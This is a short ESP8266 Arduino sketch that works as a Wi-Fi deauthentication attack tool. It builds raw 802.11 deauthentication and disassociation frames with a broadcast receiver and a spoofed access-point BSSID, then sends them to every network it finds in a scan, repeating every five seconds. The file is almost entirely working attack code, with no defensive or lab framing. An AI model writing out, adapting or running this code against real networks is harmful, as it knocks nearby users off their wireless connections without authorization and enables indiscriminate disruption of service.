#include "ESP8266WiFi.h"

/*
 * The packet has this structure:
 * 0-1:   type (C0 is deauth)
 * 2-3:   duration
 * 4-9:   receiver address (broadcast)
 * 10-15: source address
 * 16-21: BSSID 
 * 22-23: sequence number
 * 24-25: reason code (1 is unspecified reason)
 */

uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};


bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {

    wifi_set_channel(wifi_channel);

    bool sent = false;

    for (int i = 0; i < tries && !sent; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

    return sent;
}

bool deauthDevice(uint8_t* mac, uint8_t wifi_channel) {

    bool success = false;

    memcpy(&packet[10], mac, 6);
    memcpy(&packet[16], mac, 6);

    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }

    // send disassociate frame
    packet[0] = 0xa0;

    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }

    return success;
}



void setup() {
  Serial.begin(115200);
}
 
void loop() {
  int networksListSize = WiFi.scanNetworks();

  for(int i = 0; i < networksListSize; i++){
    Serial.println(WiFi.SSID(i) + " " + WiFi.RSSI(i));
    deauthDevice(WiFi.BSSID(i), WiFi.channel(i));
  }
  
  Serial.println("");
  delay(5000);
}
